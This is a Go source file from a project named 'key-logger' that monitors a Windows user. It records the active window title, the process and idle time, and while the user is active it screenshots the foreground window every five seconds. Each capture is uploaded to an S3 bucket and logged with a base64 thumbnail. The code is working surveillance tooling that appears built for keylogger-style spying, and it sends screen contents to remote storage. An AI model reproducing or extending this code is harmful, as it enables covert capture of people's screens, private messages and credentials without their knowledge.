package window

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/jpeg"
	"regexp"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/gonutz/w32/v2"
	"github.com/kbinani/screenshot"
	"golang.org/x/image/draw"

	"key-logger/pkg/model"
	"key-logger/pkg/s3"
)

var (
	psapi                      = syscall.NewLazyDLL("psapi.dll")
	getProcessFilenameProc     = psapi.NewProc("GetProcessImageFileNameW")
	winuser                    = syscall.NewLazyDLL("user32.dll")
	getLastInputInfoProc       = winuser.NewProc("GetLastInputInfo")
	shellscaling               = syscall.NewLazyDLL("Shcore.dll")
	setProcessDpiAwarenessProc = shellscaling.NewProc("SetProcessDpiAwareness")
	kernel32                   = syscall.NewLazyDLL("kernel32.dll")
	getTickCountProc           = kernel32.NewProc("GetTickCount")

	EightyFivePercent = jpeg.Options{Quality: 85}
)

func setProcessDpiAwarenessContext() bool {
	// Tell Windows we are per monitor DPI aware
	ret, _, err := setProcessDpiAwarenessProc.Call(2)
	fmt.Println("set proc DPI", ret)
	if ret != 0 {
		fmt.Println("Set DPI Error", err)
	}
	return ret != 0
}

type Window struct {
	logger           log.Logger
	idleTime         uint32
	wmtx             sync.Mutex
	activeProcess    string
	activeWindowName string
	bounds           image.Rectangle
	s3               *s3.S3
	cleanRegex       *regexp.Regexp
}

func New(logger log.Logger, s3 *s3.S3) *Window {
	reg, err := regexp.Compile("[^a-zA-Z0-9]+")
	if err != nil {
		panic(err)
	}
	w := &Window{
		logger:     logger,
		s3:         s3,
		cleanRegex: reg,
	}
	setProcessDpiAwarenessContext()
	go w.updateActiveWindowInfoLoop()
	go w.getLastInputInfoLoop()
	go w.logLastInputInfoLoop()
	return w
}

func (w *Window) GetActiveWindowName() string {
	w.wmtx.Lock()
	defer w.wmtx.Unlock()
	return w.activeWindowName
}

func (w *Window) GetActiveProcess() string {
	w.wmtx.Lock()
	defer w.wmtx.Unlock()
	return w.activeProcess
}

func getProcessFileName(mod w32.HANDLE) string {
	var path [32768]uint16
	ret, _, _ := getProcessFilenameProc.Call(
		uintptr(mod),
		uintptr(unsafe.Pointer(&path[0])),
		uintptr(len(path)),
	)
	if ret == 0 {
		return ""
	}
	return syscall.UTF16ToString(path[:])
}

func (w *Window) updateActiveWindowInfoLoop() {
	for {
		handle := w32.GetForegroundWindow()
		_, id := w32.GetWindowThreadProcessId(handle)
		ph := w32.OpenProcess(w32.PROCESS_QUERY_INFORMATION, false, uint32(id))
		filename := getProcessFileName(ph)
		w32.CloseHandle(ph)
		rect := w32.GetWindowRect(handle)
		bounds := image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
		w.wmtx.Lock()
		w.activeProcess = filename
		w.activeWindowName = w32.GetWindowText(handle)
		w.bounds = bounds
		w.wmtx.Unlock()
		time.Sleep(500 * time.Millisecond)
	}
}

type lastInputInfo struct {
	CbSize uint32
	DwTime uint32
}

func getLastInputInfo(lii *lastInputInfo) bool {
	ret, _, _ := getLastInputInfoProc.Call(uintptr(unsafe.Pointer(lii)))
	return ret != 0
}

func getTickCount() uint32 {
	ret, _, _ := getTickCountProc.Call()
	return uint32(ret)
}

func (w *Window) getLastInputInfoLoop() {
	lii := &lastInputInfo{}
	lii.CbSize = uint32(unsafe.Sizeof(lii))
	for {
		ret := getLastInputInfo(lii)
		if !ret {
			fmt.Println("getLastInputInfo Failed")
		}
		tick := getTickCount()
		atomic.StoreUint32(&w.idleTime, tick-lii.DwTime)
		time.Sleep(1 * time.Second)
	}
}

func (w *Window) logLastInputInfoLoop() {
	sendInterval := 5 * time.Second
	idleTime := 5 * time.Minute
	for {
		idle := atomic.LoadUint32(&w.idleTime)
		start := time.Now()
		if int64(idle) < idleTime.Milliseconds() {
			w.wmtx.Lock()
			win := w.activeWindowName
			proc := w.activeProcess
			bounds := w.bounds
			w.wmtx.Unlock()
			im := &model.Image{}
			if w.s3 != nil && bounds.Dx() > 0 && bounds.Dy() > 0 {
				img, err := screenshot.CaptureRect(bounds)
				if err != nil {
					panic(err)
				}
				now := time.Now()
				im.Location = fmt.Sprintf("caps/%d/%d/%d/%d_%s.jpg", now.Year(), now.Month(), now.Day(), now.Unix(), w.cleanRegex.ReplaceAllString(win, ""))
				im.Image = img
				w.s3.Send(im)

				dst := image.NewRGBA(image.Rect(0, 0, 640, 360))
				draw.CatmullRom.Scale(dst, dst.Rect, img, img.Bounds(), draw.Over, nil)
				buf := &bytes.Buffer{}
				jpeg.Encode(buf, dst, &EightyFivePercent)
				b64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
				imageLoc := fmt.Sprintf("%s/%s/%s", w.s3.GetEndpoint(), w.s3.GetBucket(), im.Location)
				level.Info(w.logger).Log("ts", time.Now(), "type", "screen-cap", "loc", imageLoc, "thumb", b64Str)
			}
			level.Info(w.logger).Log("ts", time.Now(), "type", "active-window", "window", win, "process", proc)
		}
		// Adjust the sleep based on how long we sent processing to make sure we send as close to every 5 seconds as possible
		executionTime := time.Since(start)
		if executionTime > sendInterval {
			executionTime = sendInterval
		}
		time.Sleep(sendInterval - executionTime)
	}

}

// save *image.RGBA to filePath with PNG format.
func save(img *image.RGBA, filePath string) {

	//// Make thumbnail

}
